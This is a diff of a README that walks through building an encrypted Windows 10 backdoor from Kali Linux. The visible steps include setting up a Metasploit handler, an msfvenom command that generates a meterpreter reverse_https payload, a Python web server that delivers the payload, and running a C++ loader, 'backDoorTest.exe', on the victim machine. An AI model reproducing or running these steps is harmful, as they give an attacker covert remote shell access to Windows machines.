@@ -7,10 +7,10 @@ In this example we will use a Kali Linux 2023.2 and Windows 10
 
 Tools used:
    - OpenSSL To create the certificate
-   - msfConsole to create the listner
-   - msfvenom to create the payload
-   - python to create the http server
-   - c++ to create the windows .exe 
+   - msfconsole to create the listener ( receive the comunication from the windows machine )
+   - msfvenom to create the payload file
+   - python to create the http server ( to deliver the payload )
+   - c++ to create the windows .exe  ( the backdoor.cpp )
 
 
 Windows 10 Backdoor Creation
@@ -37,7 +37,7 @@ In Kali >
     rm -f www.example.com.key  www.example.com.crt
     
       
-4- Config the msfconsole Listner
+4- Config the msfconsole Listener
 
     msfconsole
     use exploit/multi/handler
@@ -60,13 +60,13 @@ In Kali >
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
     
    
-6- Setup the http webserver for Payload download (while in cybersecurity folder)
+6- Setup the http webserver for Payload deliver (important to do this in the same folder the payload was created)
 
     python -m http.server
     
 In Windows >
     
-1- Execute the File created in point (2) backDoorTest.exe
+1- Execute the File created in point (2) "backDoorTest.exe"
     
     backDoorTest.exe ( can be execute with paramters IP, Port and PayLoad File ) 
  
